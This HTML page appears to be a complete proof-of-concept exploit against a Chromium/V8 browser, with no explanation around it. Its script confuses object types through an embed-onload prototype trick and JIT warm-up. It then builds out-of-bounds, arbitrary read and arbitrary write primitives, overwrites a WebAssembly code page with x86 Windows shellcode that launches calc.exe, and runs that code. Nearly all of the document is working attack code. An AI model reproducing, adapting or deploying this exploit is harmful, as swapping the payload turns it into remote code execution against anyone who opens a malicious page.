<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<script type="text/javascript">

function sleep (time) { 
    return new Promise((resolve) => setTimeout(resolve, time)); 
}

function gc(){
  //for(var i = 0;i < ((0x20));i++){
  //  var a = new ArrayBuffer(0x100000);
  //}
}

function wasm_func() {
  var wasmImports = {
      env: {
          puts: function puts (index) {
              print(utf8ToString(h, index));
          }
      }
  };

  var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
      96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
      116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
      131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
      109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
      128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
      65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
  let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
  let h = new Uint8Array(m.exports.memory.buffer);
  return m.exports.hello;
}
var wasm_function = wasm_func();

var buf = new ArrayBuffer(16);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);

var dv = new DataView(buf);

function f2i(val)
{
	dv.setFloat64(0,val,true);
  return dv.getBigUint64(0,true);
}

function i2f(val)
{
	dv.setBigUint64(0,BigInt(val),true);
  return dv.getFloat64(0,true);
}

function f2half(f)
{
  f64[0] = f;
  let tmp = Array.from(u32);
  return tmp;
}

function half2f(val)
{
  u32.set(val);
  return f64[0];
}

function p64f(high,low){
  let num = (high * 0x100000000n) + low;
  return i2f(num);
}

function ByteToBigIntArray(payload)
{

    let sc = []
    let tmp = 0n;
    let lenInt = BigInt(Math.floor(payload.length/8))
    for (let i = 0n; i < lenInt; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }

    let len = payload.length%8;
    tmp = 0n;
    for(let i=0n; i<len; i++){
        tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
    }
    sc.push(tmp);
    return sc;
}

function hex(i){
  return i.toString(16).padStart(16,"0");
}


global_object = {};
setPropertyViaEmbed = (object, value, handler) => {
  const embed = document.createElement('embed');
  embed.onload = handler;
  embed.type = 'text/html';
  Object.setPrototypeOf(global_object, embed);
  document.body.appendChild(embed);
  object.corrupted_prop = value;
  embed.remove();
}

createCorruptedPair = (value_1, value_2) => {
  const object_1 = {
    __proto__: global_object
  };
  object_1.regular_prop = 1;

  setPropertyViaEmbed(object_1, value_2, () => {
  	//alert("[+]call setPropertyViaEmbed inside!");
    Object.setPrototypeOf(global_object, null);
    object_1.corrupted_prop = value_1;
  });

  const object_2 = {
    __proto__: global_object
  };
  object_2.regular_prop = 1;
	

  setPropertyViaEmbed(object_2, value_2, () => {
    Object.setPrototypeOf(global_object, null);
    object_2.corrupted_prop = value_1;
    object_1.regular_prop = 1.1;
  });
  return [object_1, object_2];
}
gc();
const array = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.1,10.0,11.11,12.12,13.37];
array.prop = 1;

//var obj = {x:"1",y:"2"};
gc();
var tmp = {};
gc();
var temp = {};
gc();
var obj = [temp,tmp,temp,tmp,temp,tmp,temp,tmp,temp,tmp,temp,tmp,temp];
gc();
var oob_arr = [13.37];
gc();
var fake_arr = [1.1,2.2,3.3,4.4];
gc();
var obj_dict = {mark:0x1337,obj:tmp};
gc();
var victimAb = new ArrayBuffer(0x400);
gc();
//var obj = [13.37,23.23]
// var obj_dict = [obj];
//alert("[*]arr & obj_dict");
const [object_1, object_2] = createCorruptedPair(array, obj);

jit = (object1, object2, val) => {
  var res = object1.corrupted_prop[12];
  object2.corrupted_prop[12] = val;
  return object2.corrupted_prop[12];
}

for (var i = 0; i < 0x10000; ++i){
  jit(object_1,object_1,1.1);
}
  
//alert(object_2.corrupted_prop);
//alert(object_2.corrupted_prop[0]);
gc();
var res = jit(object_1,object_2,i2f(0x12345678));

//%DebugPrint(oob_arr);
//%DebugPrint(fake_arr);
//%DebugPrint(obj_dict);
//alert(oob_arr.length);
//hajack the fake_arr

function arb_read(addr)
{
  oob_arr[9] = p64f(0x10n,addr-0x8n);
  return f2i(fake_arr[0]);
}

function arb_write(addr, val)
{
    oob_arr[9] = p64f(0x10n,addr-0x8n);
    fake_arr[0] = i2f(val);
}


function addressOf(obj){
    let obj_idx = 12;
    obj_dict.obj = obj;
    return f2i(oob_arr[obj_idx]) & 0xffffffffn;
}


//addressOf(wasm_function);
var wasm_function_addr = addressOf(wasm_function);
//alert("[+]wasm addr : " + hex(wasm_function_addr));
var shared_info_addr = arb_read(wasm_function_addr+0xcn) & 0xffffffffn;
//alert("[+] shared info addr : 0x" + hex(shared_info_addr));
var data_addr = arb_read(shared_info_addr+0x4n) & 0xffffffffn;
//alert("[+] data addr : 0x" + hex(data_addr));
var instance_addr = arb_read(data_addr+0x8n) & 0xffffffffn;
//alert("[+] instance addr : 0x" + hex(instance_addr));
var wasm_addr = arb_read(instance_addr+0x40n) & 0xffffffffn;
//alert("[+] wasm addr : 0x" + hex(wasm_addr));

// leak target

var shellcode = [0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x08,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x01,0xc3,0x8b,0x5b,0x78,0x01,0xc3,0x8b,0x7b,0x20,0x01,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x01,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x01,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x03,0x7d,0xfc,0x66,0x83,0xc1,0x08,0xf3,0xa6,0x74,0x05,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x04,0x41,0x8b,0x04,0x82,0x03,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x08,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x01,0x65,0x73,0x73,0xc1,0xe9,0x08,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0];


//let shellcode = [0xcc,0xcc,0xcc,0xcc];

var ab_addr = addressOf(victimAb);
//alert("[+]arrayBuffer addr : " + hex(ab_addr));
arb_write(ab_addr+0x10n,wasm_addr);
var write_tmp = new Uint8Array(victimAb);
write_tmp.set(shellcode);

wasm_function();



</script>
</body>
</html>